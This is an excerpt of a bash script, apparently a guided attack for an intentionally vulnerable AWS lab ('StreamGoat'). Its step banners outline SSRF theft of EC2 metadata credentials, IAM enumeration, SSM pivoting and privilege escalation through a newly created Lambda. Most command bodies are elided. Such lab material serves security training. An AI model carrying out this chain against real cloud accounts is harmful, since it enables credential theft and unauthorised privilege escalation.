...
banner() {
  ...
  printf "  • Step 1. Explotation of Web SSRF, IMDS stealing on EC2a\n"
  printf "  • Step 2. Permission enumeration for stolen IMDS\n"
  printf "  • Step 3. Access gathering to EC2b\n"
  printf "  • Step 4. Insatling awscli to perform next action from the inside\n"
...
#############################################
# Step 1. Step 1. Explotation of Web SSRF, IMDS stealing on EC2a
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 1. Explotation of Web SSRF, IMDS stealing on EC2a  ===" "${RESET}"
is_valid_ipv4() {
...
step "Verification of explotation SSRF"
...
# End of Step 2
#############################################
# Step 3. Access gathering to EC2a
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Access gathering to EC2a  ===" "${RESET}"
...
# End of Step 3
#############################################
# Step 4. Insatling awscli to perform next action from the inside
#############################################
...
echo "$POLICY_CONTENT" | jq -r '.PolicyDocument.Statement[].Action' | sed 's/^/  • /'

printf "We were able to check role, policy and permissions because EC2a has assigned: ${YELLOW}iam:ListRoles${RESET}, ${YELLOW}iam:ListRolePolicies${RESET}, ${YELLOW}iam:GetRolePolicy${RESET} and ${YELLOW}iam:GetRole${RESET}.\n"
...
printf "And than execute it having ${YELLOW}lambda:InvokeFunction${RESET}.\n"

read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 5
#############################################
# Step 6. Three-step SSM: discover AttachRolePolicy via inline policies
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "=== 6. Discover iam:AttachRolePolicy across StreamGoat-* roles (3 SSM calls) ===" "${RESET}"
...
# End of Step 6
#############################################
# Step 7. Create/Update Lambda (PrivEsc) via SSM on EC2b
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "=== 7. Create Lambda 'StreamGoat-PrivEsc-Lambda' via SSM on EC2b ===" "${RESET}"

printf "We are going to craete PrivEsc and set ${YELLOW}$BEST_ROLE${RESET} role on it.\n"
...
# End of Step 7
#############################################
# Step 8. Invoke PrivEsc Lambda via SSM on EC2b (base64-transported script/event)
#############################################
...
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"
printf "${BOLD}${GREEN}Now we have permissions we didn't have before\n${RESET}"
read -r -p "Step 9 is completed. Press Enter to finish (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 9
#############################################
# Step 10. Remove PrivEsc Lambda
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  10. Delete Lambda '${LAMBDA_NAME}'  ===" "${RESET}"
printf "Lambda deletion is option step for attack but needed since it will not be deleted by Terraform\n"
